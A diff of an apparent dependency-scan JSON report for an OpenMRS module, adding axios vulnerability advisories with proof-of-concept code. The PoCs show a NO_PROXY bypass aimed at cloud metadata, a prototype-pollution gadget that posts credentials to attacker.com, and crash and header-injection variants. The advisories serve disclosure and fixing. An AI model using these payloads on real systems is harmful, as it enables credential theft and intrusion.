@@ -5,19 +5,19 @@
         "dataSource": [
 {
                 "name": "NVD API Last Checked",
-                "timestamp": "2026-05-27T14:37:00Z"
+                "timestamp": "2026-06-03T15:58:37Z"
             }
 ,{
                 "name": "NVD API Last Modified",
-                "timestamp": "2026-05-27T14:26:15Z"
+                "timestamp": "2026-06-03T15:42:35Z"
             }
 ,{
                 "name": "NVD Cache Last Checked",
-                "timestamp": "2026-05-27T14:37:00Z"
+                "timestamp": "2026-06-03T15:58:37Z"
             }
 ,{
                 "name": "NVD Cache Last Modified",
-                "timestamp": "2026-05-27T14:26:15Z"
+                "timestamp": "2026-06-03T15:42:35Z"
             }
         ]
 
@@ -203,7 +203,7 @@
     },
     "projectInfo": {
         "name": "openmrs-module-openconceptlab",
-        "reportDate": "2026-05-27T19:40:58.576731368Z",
+        "reportDate": "2026-06-04T07:15:58.428308301Z",
         "credits": {
             "NVD": "This product uses the NVD API but is not endorsed or certified by the NVD. This report contains data retrieved from the National Vulnerability Database: https://nvd.nist.gov",
             "CISA": "This report may contain data retrieved from the CISA Known Exploited Vulnerability Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
@@ -30723,10 +30723,14 @@
                 "notes": "",
                 "references": [
  {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-253495.html"                    }, {
                         "source": "security-advisories@github.com"
 ,"url": "https:\/\/github.com\/angular\/angular\/commit\/1c6b0704fb63d051fab8acff84d076abfbc4893a","name": "PATCH"                    }, {
                         "source": "security-advisories@github.com"
-,"url": "https:\/\/github.com\/angular\/angular\/security\/advisories\/GHSA-v4hv-rgfq-gp49","name": "THIRD_PARTY_ADVISORY"                    }                ],
+,"url": "https:\/\/github.com\/angular\/angular\/security\/advisories\/GHSA-v4hv-rgfq-gp49","name": "THIRD_PARTY_ADVISORY"                    }, {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-485750.html"                    }                ],
                 "vulnerableSoftware": [
  {
                         "software": { 
@@ -30809,8 +30813,12 @@
  {
                         "source": "security-advisories@github.com"
 ,"url": "https:\/\/github.com\/angular\/angular\/pull\/66318","name": "ISSUE_TRACKING"                    }, {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-253495.html"                    }, {
                         "source": "security-advisories@github.com"
 ,"url": "https:\/\/github.com\/angular\/angular\/security\/advisories\/GHSA-jrmj-c5cx-3cw6","name": "MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-485750.html"                    }, {
                         "source": "security-advisories@github.com"
 ,"url": "https:\/\/github.com\/angular\/angular\/commit\/91dc91bae4a1bbefc58bef6ef739d0e02ab44d56","name": "PATCH"                    }                ],
                 "vulnerableSoftware": [
@@ -39172,6 +39180,34 @@
 ,"versionStartIncluding":"1.0.0","versionEndExcluding":"1.15.1"                        }
                     }                ]
                 }, {
+                "source": "RETIREJS",
+                "name": "CVE-2026-44492",
+"unscored": "true", "severity" : "high",
+                "description": "The shouldBypassProxy function introduced in Axios 1.15.0 does not normalize IPv4-mapped IPv6 addresses, allowing bypass of NO_PROXY exclusions when requests use IPv4-mapped IPv6 notation to target excluded IPv4 addresses.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "ghsaId"
+,"name": "GHSA-pjwm-pj3p-43mv"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-pjwm-pj3p-43mv","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-pjwm-pj3p-43mv"                    }                ],
+                "vulnerableSoftware": [
+                ]
+                }, {
+                "source": "RETIREJS",
+                "name": "CVE-2026-44495",
+"unscored": "true", "severity" : "high",
+                "description": "Axios contains prototype pollution gadgets in request config processing; a polluted Object.prototype.transformResponse can be executed with access to request credentials and response data, enabling credential theft and response hijacking across all requests.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "ghsaId"
+,"name": "GHSA-3g43-6gmg-66jw"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3g43-6gmg-66jw","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3g43-6gmg-66jw"                    }                ],
+                "vulnerableSoftware": [
+                ]
+                }, {
                 "source": "NVD",
                 "name": "CVE-2026-42039",
                     "severity" : "MEDIUM",
@@ -39615,6 +39651,20 @@
                             "id":"cpe:2.3:a:axios:axios:*:*:*:*:*:node.js:*:*"
 ,"versionStartIncluding":"1.0.0","versionEndExcluding":"1.15.0"                        }
                     }                ]
+                }, {
+                "source": "RETIREJS",
+                "name": "CVE-2026-44490",
+"unscored": "true", "severity" : "medium",
+                "description": "Axios 1.15.2 exposes two prototype pollution gadgets: HTTP header injection via utils.merge() building plain objects that walk the prototype chain, and a crash DoS where a polluted Object.prototype.get or .set causes TypeError on every axios request.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-898c-q2cr-xwhg","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-898c-q2cr-xwhg"                    }, {
+                        "source": "ghsaId"
+,"name": "GHSA-898c-q2cr-xwhg"                    }                ],
+                "vulnerableSoftware": [
+                ]
                 }, {
                 "source": "RETIREJS",
                 "name": "axios PR: 6300",
@@ -40142,6 +40192,34 @@
 ,"versionStartIncluding":"1.0.0","versionEndExcluding":"1.15.1"                        }
                     }                ]
                 }, {
+                "source": "RETIREJS",
+                "name": "CVE-2026-44492",
+"unscored": "true", "severity" : "high",
+                "description": "The shouldBypassProxy function introduced in Axios 1.15.0 does not normalize IPv4-mapped IPv6 addresses, allowing bypass of NO_PROXY exclusions when requests use IPv4-mapped IPv6 notation to target excluded IPv4 addresses.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "ghsaId"
+,"name": "GHSA-pjwm-pj3p-43mv"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-pjwm-pj3p-43mv","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-pjwm-pj3p-43mv"                    }                ],
+                "vulnerableSoftware": [
+                ]
+                }, {
+                "source": "RETIREJS",
+                "name": "CVE-2026-44495",
+"unscored": "true", "severity" : "high",
+                "description": "Axios contains prototype pollution gadgets in request config processing; a polluted Object.prototype.transformResponse can be executed with access to request credentials and response data, enabling credential theft and response hijacking across all requests.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "ghsaId"
+,"name": "GHSA-3g43-6gmg-66jw"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3g43-6gmg-66jw","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3g43-6gmg-66jw"                    }                ],
+                "vulnerableSoftware": [
+                ]
+                }, {
                 "source": "NVD",
                 "name": "CVE-2026-42039",
                     "severity" : "MEDIUM",
@@ -40587,6 +40665,20 @@
                     }                ]
                 }, {
                 "source": "RETIREJS",
+                "name": "CVE-2026-44490",
+"unscored": "true", "severity" : "medium",
+                "description": "Axios 1.15.2 exposes two prototype pollution gadgets: HTTP header injection via utils.merge() building plain objects that walk the prototype chain, and a crash DoS where a polluted Object.prototype.get or .set causes TypeError on every axios request.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-898c-q2cr-xwhg","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-898c-q2cr-xwhg"                    }, {
+                        "source": "ghsaId"
+,"name": "GHSA-898c-q2cr-xwhg"                    }                ],
+                "vulnerableSoftware": [
+                ]
+                }, {
+                "source": "RETIREJS",
                 "name": "axios PR: 6300",
 "unscored": "true", "severity" : "medium",
                 "description": "Versions before 1.6.8 depends on follow-redirects before 1.15.6 which could leak the proxy authentication credentials",
@@ -40803,6 +40895,40 @@
                         "software": { 
                             "id":"cpe:2.3:a:axios:axios:*:*:*:*:*:node.js:*:*"
 ,"vulnerabilityIdMatched":"true","versionEndExcluding":"1.7.8"                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-pjwm-pj3p-43mv",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 8.600000381469727
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "CHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "NONE"
+                        ,"availabilityImpact": "NONE"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-918"                    ],
+                "description": "### Summary\nshouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.\n\n### Details\nlib\/helpers\/shouldBypassProxy.js (v1.15.0):                                                                                                                                   \n\n```javascript                                                                                                                                                                              \n  const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);                                                                                                      \n  const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);                                                                                                                    \n                                                                                                                                                                                \n  \/\/ normalizeNoProxyHost strips brackets and trailing dots, but not ::ffff: prefix                                                                                             \n  return hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));                                                                                             \n```\n                                                                                                                                                                                \nThe WHATWG URL parser canonicalises `http:\/\/[::ffff:127.0.0.1]\/` to hostname `[::ffff:7f00:1]`. After bracket-stripping: `::ffff:7f00:1`. This string does not match 127.0.0.1 in NO_PROXY and is not in LOOPBACK_ADDRESSES, so shouldBypassProxy returns false and the proxy is used.  proxy-from-env (called before shouldBypassProxy) has the same gap - it does not equate ::ffff:7f00:1 with 127.0.0.1 - so neither layer catches the bypass.\n\n### PoC\n```javascript\n\n\/\/ NO_PROXY=127.0.0.1,localhost,::1  HTTP_PROXY=http:\/\/attacker:8080\nimport shouldBypassProxy from 'axios\/lib\/helpers\/shouldBypassProxy.js';                                                                                                       \n                                                                                                                                                                              \n\/\/ All three should return true (bypass proxy). Only the first two do.                                                                                                        \nconsole.log(shouldBypassProxy('http:\/\/127.0.0.1\/'));          \/\/ true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http:\/\/[::1]\/'));               \/\/ true  [OK]                                                                                                     \nconsole.log(shouldBypassProxy('http:\/\/[::ffff:127.0.0.1]\/')); \/\/ false <- bypass                                                                                             \nconsole.log(shouldBypassProxy('http:\/\/[::ffff:7f00:1]\/'));     \/\/ false <- bypass\n\n```                                                                                              \n                                                                                                                                                                              \nNode.js routes ::ffff:7f00:1 to 127.0.0.1:                                                                                                                                    \n\n```                                                                                                                                                                              \n\/\/ net.connect({ host: '::ffff:7f00:1', port: 80 }) reaches a service                                                                                                       \n\/\/ bound to 127.0.0.1:80 \u2014 confirmed on Node.js v24, Linux and macOS.                                                                                                         \n```                                                                                                                                                                              \nCloud metadata SSRF: ::ffff:a9fe:a9fe = ::ffff:169.254.169.254. If NO_PROXY=169.254.169.254 is set to block IMDS access, a request to http:\/\/[::ffff:a9fe:a9fe]\/latest\/meta-data\/ bypasses it.                                                                                                                      \n                                                                                                                                                                            \n#### Fix                                                                                                                                                                           \n                                                                                                                                                                            \nCanonicalise IPv4-mapped IPv6 in normalizeNoProxyHost before any comparison:                                                                                                  \n \n ```javascript                                                                                                                                                                           \nconst ipv4MappedDotted = \/^::ffff:(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$\/i;                                                                                                    \nconst ipv4MappedHex    = \/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$\/i;                                                                                                         \n                                                                                                                                                                              \nfunction hexToIPv4(a, b) {                                                                                                                                                    \n  const hi = parseInt(a, 16), lo = parseInt(b, 16);                                                                                                                           \n  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;                                                                                                                   \n}                                                                                                                                                                             \n                                                                                                                                                                              \nconst normalizeNoProxyHost = (hostname) => {                                                                                                                                  \n  if (!hostname) return hostname;                                                                                                                                           \n  if (hostname[0] === '[' && hostname.at(-1) === ']')\n    hostname = hostname.slice(1, -1);                                                                                                                                         \n  hostname = hostname.replace(\/\\.+$\/, '').toLowerCase();\n                                                                                                                                                                              \n  let m;                                                                                                                                                                    \n  if ((m = hostname.match(ipv4MappedDotted))) return m[1];                                                                                                                    \n  if ((m = hostname.match(ipv4MappedHex)))    return hexToIPv4(m[1], m[2]);                                                                                                   \n  return hostname;                                                                                                                                                            \n};\n\n```\n\n### Impact\nAny application that sets NO_PROXY to exclude internal or metadata endpoints and uses an HTTP\/HTTPS proxy can have those exclusions bypassed by a URL using IPv4-mapped IPv6 notation. The attacker must control the request URL. In cloud environments with instance metadata services, this can lead to credential exfiltration.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-pjwm-pj3p-43mv","name": "https:\/\/github.com\/advisories\/GHSA-pjwm-pj3p-43mv"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2025-62718","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2025-62718"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-pjwm-pj3p-43mv","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-pjwm-pj3p-43mv"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:axios:\\<\\=0.31.1:*:*:*:*:*:*:*"
+                        }
                     }                ]
                 }, {
                 "source": "NVD",
@@ -41442,6 +41568,38 @@
                     }                ]
                 }, {
                 "source": "NPM",
+                "name": "GHSA-3g43-6gmg-66jw",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 7.0
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "LOW"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-1321",                        "CWE-94"                    ],
+                "description": "## Summary\n\nAxios versions before the fixed releases contain prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted `Object.prototype.transformResponse`, affected Axios versions may treat that inherited value as request configuration or as an option validator.\n\nAxios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over `Object.prototype` before Axios creates a request.\n\n## Impact\nFor ordinary prototype-pollution primitives that can only assign JSON-like values, this issue primarily results in request failures or denial-of-service attacks.\n\nIf the attacker can pollute `Object.prototype.transformResponse` with a function, affected versions of Axios may execute it. In fully affected versions, the function can observe response data and request config, including URL, headers, and `auth`, and can change the response data returned to application code.\n\nThis function-valued condition is important. Most query-string or JSON parser prototype-pollution bugs cannot create JavaScript functions on their own, so credential exposure and response tampering are conditional rather than automatic consequences of such bugs.\n\n## Affected Functionality\nThe affected functionality is Axios request config processing and response transformation.\n\nAffected use requires all of the following:\n- An affected Axios version.\n- A polluted `Object.prototype` in the same process or browser context.\n- Pollution before Axios merges or validates the request config.\n- A polluted key relevant to Axios config, especially `transformResponse`.\n\nThis is not specific to the Node HTTP adapter. Browser and Node usage can both pass through the shared config\/transform pipeline, though real-world exploitability depends on the surrounding application and any helper vulnerabilities.\n\n## Technical Details\nIn affected versions, `mergeConfig()` reads config values through normal property access. For config keys present in Axios defaults, including `transformResponse`, a missing own property on the request config can fall through to `Object.prototype`.\n\nIn the fully affected path, this means `Object.prototype.transformResponse` can replace Axios's default response transform. The selected transform is later executed by `transformData()` with the request config as `this`.\n\nSome later affected v1 releases guarded the merge path but still used inherited properties while looking up validators in `validator.assertOptions()`. In that narrower case, a polluted function can still run during config validation and inspect the config argument, but it does not replace the response transform.\n\nFixed versions use own-property checks and null-prototype config objects, so inherited `Object.prototype` values are not treated as Axios config or validator schema entries.\n\n## Proof of Concept of Attack\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst seen = [];\n\nconst server = http.createServer((req, res) => {\n  res.setHeader('Content-Type', 'application\/json');\n  res.end(JSON.stringify({ secret: 'response-secret' }));\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.transformResponse = function pollutedTransform(data, headers, status) {\n  if (headers && typeof status === 'number') {\n    seen.push({\n      url: this.url,\n      username: this.auth && this.auth.username,\n      password: this.auth && this.auth.password,\n      responseData: data\n    });\n\n    return { hijacked: true };\n  }\n\n  return true;\n};\n\ntry {\n  const { port } = server.address();\n\n  const response = await axios.get(`http:\/\/127.0.0.1:${port}\/users`, {\n    auth: { username: 'svc-account', password: 'prod-secret-key-123' }\n  });\n\n  console.log(response.data); \/\/ { hijacked: true }\n  console.log(seen[0]);       \/\/ request config plus original response body\n} finally {\n  delete Object.prototype.transformResponse;\n\n  server.close();\n}\n```\n\nExpected result on fully affected versions: the polluted transform runs, captures request config and response data, and replaces the response returned to the caller.\n\nExpected result on fixed versions: the polluted transform is ignored, and the original response is returned.\n\n<details>\n<summary>Original source report<\/summary>\n\n## Summary\n\nThe Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any `Object.prototype` pollution in the application's dependency tree to be escalated into **credential theft** and **response hijacking** across all Axios requests.\n\nThe `mergeConfig()` function reads config properties via standard property access (`config2[prop]`), which traverses the JavaScript prototype chain. When `Object.prototype.transformResponse` is polluted with a function, it **overrides the default JSON response parser** for every request. The injected function executes with `this = config`, exposing `auth.username`, `auth.password`, request URL, and all headers.\n\n**Severity:** High (CVSS 8.2)\n**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)\n**Vulnerable Component:** `lib\/core\/mergeConfig.js` (Config Merge) + `lib\/core\/transformData.js` (Transform Execution)\n\n## CWE\n\n- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\n\n## CVSS 3.1\n\n**Score: 9.4 (High)**\n\nVector: `CVSS:3.1\/AV:N\/AC:L\/PR:N\/UI:N\/S:U\/C:H\/I:L\/A:H`\n\n| Metric | Value | Justification |\n|---|---|---|\n| Attack Vector | Network | PP is triggered remotely via any vulnerable dependency |\n| Attack Complexity | Low | Once PP exists, a single property assignment exploits axios. Consistent with GHSA-fvcv-3m26-pcqx scoring |\n| Privileges Required | None | No authentication needed |\n| User Interaction | None | No user interaction required |\n| Scope | Unchanged | Credential theft occurs within the same application process |\n| Confidentiality | High | `this.auth.password`, `this.url`, original response data all exfiltrated |\n| Integrity | Low | Response data is replaced with `true` \u2014 attacker **cannot** return arbitrary data due to `assertOptions` constraint (see below) |\n| Availability | High | Polluting with an array value causes `TypeError: validator is not a function` crash (DoS) on every request |\n\n### Relationship to GHSA-fvcv-3m26-pcqx\n\nThis vulnerability is in the same class as GHSA-fvcv-3m26-pcqx (\"Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\"), which was also a PP gadget in axios rated Critical. Both require zero direct user input and exploit `mergeConfig`'s prototype chain traversal.\n\n| Factor | GHSA-fvcv-3m26-pcqx | This Vulnerability |\n|---|---|---|\n| Attack vector | PP \u2192 Header injection \u2192 Request smuggling | PP \u2192 Transform function override \u2192 Credential theft |\n| Fixed by 1.15.0 header sanitization? | Yes | **No \u2014 different code path** |\n| Affects | Requests using form-data package | **All requests** (transformResponse is in defaults) |\n| Impact | AWS IMDSv2 bypass, cloud compromise | Credential theft (auth, API keys), response hijacking, DoS |\n\n## Usage of \"Helper\" Vulnerabilities\n\nThis vulnerability requires **Zero Direct User Input**.\n\nIf an attacker can pollute `Object.prototype` via any other library in the stack (e.g., `qs`, `minimist`, `lodash`, `body-parser`), Axios will automatically pick up the polluted `transformResponse` property during its config merge.\n\nThe critical difference from GHSA-fvcv-3m26-pcqx: this vector was **NOT fixed** by the header sanitization patch in v1.15.0, because it does not use headers at all \u2014 it injects a function into the response processing pipeline.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated Pollution)\n\nImagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:\n\n```javascript\nObject.prototype.transformResponse = function(data, headers, status) {\n  \/\/ Steal credentials via this context (this = full request config)\n  if (this && this.url && typeof data === 'string') {\n    fetch('https:\/\/attacker.com\/exfil', {\n      method: 'POST',\n      body: JSON.stringify({\n        url: this.url,\n        username: this.auth?.username,\n        password: this.auth?.password,\n        responseData: data,\n      })\n    });\n  }\n  return true;  \/\/ MUST return true to pass assertOptions validator check\n};\n```\n\n**Important constraint:** The polluted value must be a **function returning `true`**, not an array. If an array is used, `assertOptions()` at `validator.js:89-92` crashes with `TypeError: validator is not a function` (which is still a DoS vector). The function must return `true` because `validator.js:93` checks `result !== true`.\n\n### 2. The Gadget Trigger (Safe Code)\n\nThe application makes a completely safe, hardcoded request:\n\n```javascript\n\/\/ This looks safe to the developer\nconst response = await axios.get('https:\/\/api.internal\/users', {\n  auth: { username: 'svc-account', password: 'prod-secret-key-123!' }\n});\n```\n\n### 3. The Execution\n\nAxios's `mergeConfig()` at `mergeConfig.js:99-103` iterates config keys:\n\n```javascript\nutils.forEach(Object.keys({...config1, ...config2}), function computeConfigValue(prop) {\n  \/\/ 'transformResponse' is in config1 (defaults) \u2192 included in keys\n  const merge = mergeMap[prop];  \/\/ \u2192 defaultToConfig2\n  const configValue = merge(config1[prop], config2[prop], prop);\n  \/\/ config2['transformResponse'] traverses prototype \u2192 finds polluted function!\n});\n```\n\nThe polluted function then executes at `transformData.js:21`:\n\n```javascript\ndata = fn.call(config, data, headers.normalize(), response ? response.status : undefined);\n\/\/ fn = attacker's function, this = config (containing auth credentials)\n```\n\n### 4. The Impact\n\n```\nAttacker receives at https:\/\/attacker.com\/exfil:\n\n{\n  \"url\": \"https:\/\/api.internal\/users\",\n  \"username\": \"svc-account\",\n  \"password\": \"prod-secret-key-123!\",\n  \"responseData\": \"{\\\"users\\\":[{\\\"id\\\":1,\\\"role\\\":\\\"admin\\\"}]}\"\n}\n```\n\nThe response data seen by the application is `true` (the required return value), which will likely cause the application to malfunction but will not reveal the theft.\n\n### 5. DoS Variant\n\n```javascript\n\/\/ Array pollution crashes every request\nObject.prototype.transformResponse = [function(d) { return d; }];\n\nawait axios.get('https:\/\/any-url.com');\n\/\/ \u2192 TypeError: validator is not a function\n\/\/ Every request in the application crashes\n```\n\n## Verified PoC Output\n\n```\nStep 1 - Normal behavior (before pollution):  \n    Default transformResponse function name: \"transformResponse\"\n\nStep 2 - Polluting Object.prototype.transformResponse:  \n    Function replaced by attacker: true\n\nStep 3 - Simulating dispatchRequest transformResponse:  \n    Original server response: {\"secret_key\":\"sk-prod-a1b2c3d4\",\"internal_ip\":\"10.0.0.5\"}  \n    After malicious transform: true  \n    Response tampered: true\n\nStep 4 - Exfiltrated data:  \n    Original response data: {\"secret_key\":\"sk-prod-a1b2c3d4\",\"internal_ip\":\"10.0.0.5\"}  \n    Request URL: https:\/\/internal-api.corp\/secrets  \n    Authentication info: {\"username\":\"admin\",\"password\":\"P@ssw0rd123!\"}\n```\n\n## Impact Analysis\n\n- **Credential Theft:** `this.auth.username`, `this.auth.password`, `this.headers.Authorization`, and all other config properties are accessible to the injected function. The attacker can exfiltrate them to an external server.\n- **Response Data Exfiltration:** The original server response (`data` parameter) is available to the injected function before being replaced.\n- **Universal Scope:** Affects **every** axios request in the application, including all third-party libraries that use axios.\n- **Denial of Service:** Polluting with a non-function value crashes every request.\n- **Bypass of 1.15.0 Fix:** The header sanitization patch in v1.15.0 (GHSA-fvcv-3m26-pcqx fix) does not address this vector.\n\n### Limitations (Honest Assessment)\n\n- Requires a separate prototype pollution vulnerability elsewhere in the dependency tree\n- Response data cannot be arbitrarily tampered \u2014 the function must return `true` to pass `assertOptions`\n- This is in-process JavaScript function execution, not OS-level RCE\n\n## Recommended Fix\n\nUse `hasOwnProperty` checks in `defaultToConfig2` to prevent prototype chain traversal:\n\n```javascript\n\/\/ In lib\/core\/mergeConfig.js\nfunction defaultToConfig2(a, b, prop) {\n  if (Object.prototype.hasOwnProperty.call(config2, prop) && !utils.isUndefined(b)) {\n    return getMergedValue(undefined, b);\n  } else if (!utils.isUndefined(a)) {\n    return getMergedValue(undefined, a);\n  }\n}\n```\n\nAdditionally, validate that `transformResponse` contains only functions before execution:\n\n```javascript\n\/\/ In lib\/core\/transformData.js\nutils.forEach(fns, function transform(fn) {\n  if (typeof fn !== 'function') {\n    throw new AxiosError('Transform must be a function', AxiosError.ERR_BAD_OPTION);\n  }\n  data = fn.call(config, data, headers.normalize(), response ? response.status : undefined);\n});\n```\n\n## Resources\n\n- [CWE-1321: Prototype Pollution](https:\/\/cwe.mitre.org\/data\/definitions\/1321.html)\n- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios (Fixed in 1.15.0)](https:\/\/github.com\/advisories\/GHSA-fvcv-3m26-pcqx)\n- [Axios GitHub Repository](https:\/\/github.com\/axios\/axios)\n- [Snyk: Prototype Pollution](https:\/\/learn.snyk.io\/lesson\/prototype-pollution\/)\n\n## Timeline\n\n| Date | Event |\n|---|---|\n| 2026-04-15 | Vulnerability discovered during source code audit |\n| 2026-04-15 | Initial PoC developed (array payload \u2014 crashes at validator.js) |\n| 2026-04-16 | PoC corrected (function payload returning true \u2014 works) |\n| 2026-04-16 | Report revised with accurate constraints |\n| TBD | Report submitted to vendor via GitHub Security Advisory |\n<\/details>",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-3g43-6gmg-66jw","name": "https:\/\/github.com\/advisories\/GHSA-3g43-6gmg-66jw"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3g43-6gmg-66jw","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3g43-6gmg-66jw"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:axios:\\>\\=0.19.0\\<0.31.1:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-jr5f-v2jv-69x6",
 "unscored": "true", "severity" : "high",
                     "cwes": [
@@ -42020,6 +42178,40 @@
  {
                         "software": { 
                             "id":"cpe:2.3:a:*:axios:\\<0.31.0:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-898c-q2cr-xwhg",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 4.800000190734863
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "NONE"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "LOW"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-1321"                    ],
+                "description": "## Summary\n\naxios `1.15.2` exposes two read-side prototype-pollution gadgets. When `Object.prototype` is polluted by an upstream dependency in the same process (e.g. lodash `_.merge` \/ [CVE-2018-16487](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-16487)), axios silently picks up the polluted values:\n\n1. **Header injection** - `lib\/utils.js` line 406 builds `merge()`'s accumulator as `result = {}`, so `result[targetKey]` (line 414) walks `Object.prototype` and the polluted bucket's own keys are copied into the merged headers and ride out on the wire.\n2. **Crash DoS** - `lib\/core\/mergeConfig.js` line 26 builds the `hasOwnProperty` descriptor as a plain-object literal. `Object.defineProperty` reads `descriptor.get`\/`descriptor.set` via the prototype chain, so a polluted `Object.prototype.get` or `Object.prototype.set` makes the call throw `TypeError` synchronously on every axios request.\n\n## Affected Properties\n\n| Polluted slot | Effect |\n|---|---|\n| `Object.prototype.common` | injects headers on every method |\n| `Object.prototype.delete` \/ `.head` \/ `.post` \/ `.put` \/ `.patch` \/ `.query` | injects headers on the matching method |\n| `Object.prototype.get` | every axios request throws `TypeError: Getter must be a function` from `mergeConfig.js:26` |\n| `Object.prototype.set` | every axios request throws `TypeError: Setter must be a function` from `mergeConfig.js:26` |\n\nPer-request headers (`axios.request(url, { headers: {...} })`) overwrite polluted entries. Polluting `Object.prototype.get` triggers the crash before any header is built.\n\n## Proof of Concept\n\n```javascript\nconst axios = require('axios');\n\n\/\/ Finding A - header injection\nObject.prototype.common = { 'X-Poisoned': 'yes' };\nawait axios.get('http:\/\/api.example.com\/users');\n\/\/ Wire request carries `X-Poisoned: yes`.\n\n\/\/ Finding B - crash DoS\nObject.prototype.get = { something: 'anything' };\nawait axios.get('http:\/\/api.example.com\/users');\n\/\/ TypeError: Getter must be a function: #<Object>\n\/\/     at Function.defineProperty (<anonymous>)\n\/\/     at mergeConfig 